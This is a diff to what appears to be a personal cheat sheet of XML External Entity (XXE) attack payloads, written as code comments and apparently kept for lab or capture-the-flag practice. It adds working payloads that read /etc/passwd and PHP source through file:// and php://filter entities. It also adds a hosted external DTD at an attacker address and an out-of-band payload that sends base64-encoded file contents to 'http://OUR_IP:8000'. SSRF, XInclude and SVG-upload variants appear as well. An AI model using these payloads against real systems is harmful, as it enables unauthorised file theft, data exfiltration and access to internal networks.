@@ -1,14 +1,32 @@
 // XML External Entity
 //! Exploiting
 //* to retrieve files
-//from
+// from
 // <?xml version="1.0" encoding="UTF-8"?>
 // <stockCheck><productId>381</productId></stockCheck>
 // to
 // <?xml version="1.0" encoding="UTF-8"?>
 // <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 // <stockCheck><productId>&xxe;</productId></stockCheck>
-
+//* to retrieve php files
+// <!DOCTYPE email [
+//   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+// ]>
+//* to retreive any file type
+// first host a server with /xxe.dtd :
+// <!ENTITY % file SYSTEM "file:///etc/passwd">
+// <!ENTITY % start "<![CDATA[">
+// <!ENTITY % end "]]>">
+// <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+// second use this in the reqeust :
+// <!DOCTYPE email [
+//   <!ENTITY % dtd SYSTEM
+//   "http://10.10.17.238:4000/xxe.dtd">
+//   %dtd;
+//   %all;
+// ]>
+// finally get your file content using :
+// &fileContents;
 //* to perform SSRF attacks
 // <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 // if it does not get a file content if gets the folder name
@@ -19,7 +37,18 @@
 // <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
 //   <text font-size="14" x="10" y="20">&xxe;</text>
 // </svg>
-
+//* Out-of-band Data Exfiltration
+// first host this under /xxe.dtd :
+// <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+// <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+// second use this in the request :
+// <!DOCTYPE email [
+//   <!ENTITY % remote SYSTEM "http://10.10.17.238:4000/xxe.dtd">
+//   %remote;
+//   %oob;
+// ]>
+// finally trigger the OOB request by using :
+// &content;
 //* XInclude attacks (when you don't have acces to the hole document)
 // <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 // <xi:include parse="text" href="file:///etc/passwd" />
@@ -34,12 +63,6 @@
 // &xxe;
 // </text>
 // </svg>
-//* Reading source in php
-//<?xml version="1.0" encoding="UTF-8"?>
-//<!DOCTYPE svg [
-//  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
-//]>
-//<svg>&xxe;</svg>
 //* XXE attacks via modified content type
 // if the application tolerates this you can performe any the previous attacks
 
